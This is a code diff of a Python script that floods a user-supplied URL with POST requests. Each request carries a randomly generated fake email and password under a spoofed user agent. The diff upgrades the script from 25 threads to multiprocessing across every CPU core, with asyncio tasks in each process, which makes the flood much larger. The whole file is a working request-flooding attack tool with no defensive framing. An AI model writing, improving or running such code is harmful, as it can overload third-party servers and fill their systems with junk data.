@@ -1,57 +1,94 @@
-import threading
-import requests
+from faker import Faker
+from aiohttp import ClientSession, ClientResponseError
+from multiprocessing import Process, cpu_count
+from typing import Any
+import uvloop
+import asyncio
 import random
 import string
-import names
-import subprocess
-
-from fake_useragent import UserAgent
+import sys
+import logging
 
 
+URL = input('Enter the URL you would like to flood: ')
+NUM_TASKS = 100
+NUM_REQUESTS_PER_TASK = 100
+IS_PYTHON_3_11_OR_LATER = sys.version_info >= (3, 11)
+
+if not IS_PYTHON_3_11_OR_LATER:
+    uvloop.install()
 
 
-def name_gen():#Generates a random name for the email
-    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
-    first_name = names.get_first_name()
-    last_name = names.get_last_name()
-    if name_system == "FullName":#JohnDoe
-        return first_name + last_name
-    elif name_system == "FullFirstFirstInitial":#JohnD
-        return first_name + last_name[0]
-    return first_name[0] + last_name#JDoe
+logging.basicConfig(
+    format='[%(levelname)s] %(message)s',
+    level=logging.INFO
+)
 
-def generate_random_email():
-    name = name_gen()
-    NumberOrNo=random.choice(["Number", "No"])
-    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])#Popular email providers
-    if NumberOrNo == "Number":
-        return name + str(random.randint(1, 100)) + domain
+
+fake = Faker()
+
+
+def generate_fake_data() -> dict[str, Any]:
+    """Generate fake data for the URL."""
+    first_name = fake.first_name().lower()
+    last_name = fake.last_name().lower()
+    # Randomize the length as well as the digits instead of using random int
+    extra_digits = ''.join(random.choices(string.digits, k=random.randint(1, 5)))
+    email_domain = fake.free_email_domain()
+
+    email = first_name + last_name + extra_digits + '@' + email_domain
+    password = fake.password(length=random.randint(8, 20))
+    return {'e': email, 'p': password}
+
+
+async def send_fake_data(session: ClientSession) -> None:
+    """Send many post requests to the URL."""
+    for _ in range(NUM_REQUESTS_PER_TASK):
+        data = generate_fake_data()
+        headers = {'User-Agent': fake.user_agent()}
+
+        try:
+            response = await session.post(URL, data=data, headers=headers)
+            response.raise_for_status()
+        except ClientResponseError as e:
+            status = e.status
+            logging.warning(f'{status}: {e.message}')
+
+            if status >= 500:
+                return
+        except Exception as e:
+            logging.error(str(e))
+            return
+        else:
+            logging.info(f'{response.status}: {data}')
+
+
+async def attack_url_async() -> None:
+    """Create and execute many tasks for the event loop."""
+    async with ClientSession() as session:
+        tasks = [asyncio.create_task(send_fake_data(session)) for _ in range(NUM_TASKS)]
+        await asyncio.gather(*tasks)
+
+
+def attack_url() -> None:
+    """Send many post requests to the URL using asyncio."""
+    if IS_PYTHON_3_11_OR_LATER:
+        with asyncio.Runner(loop_factory=uvloop.new_event_loop) as runner:
+            runner.run(attack_url_async())
     else:
-        return name + domain
+        asyncio.run(attack_url_async())
 
-def generate_random_password():
-    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
 
-def send_posts(url):
-    while True:
-        email = generate_random_email()
-        password = generate_random_password()
-        data = {"a": email, "az": password}
-        ua = UserAgent()
-        user_agent = ua.random
-        headers = {'User-Agent': user_agent}
-        response = requests.post(url, data=data, headers=headers,)
-        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
+def main() -> None:
+    """Use multiple CPU cores to flood the URL, each with its own async event loop."""
+    processes = [Process(target=attack_url, daemon=True) for _ in range(cpu_count())]
 
-def main():
-    url = input("Enter the URL of the target you want to flood: ")
-    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]
+    for process in processes:
+        process.start()
 
-    for t in threads:
-        t.start()
+    for process in processes:
+        process.join()
 
-    for t in threads:
-        t.join()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
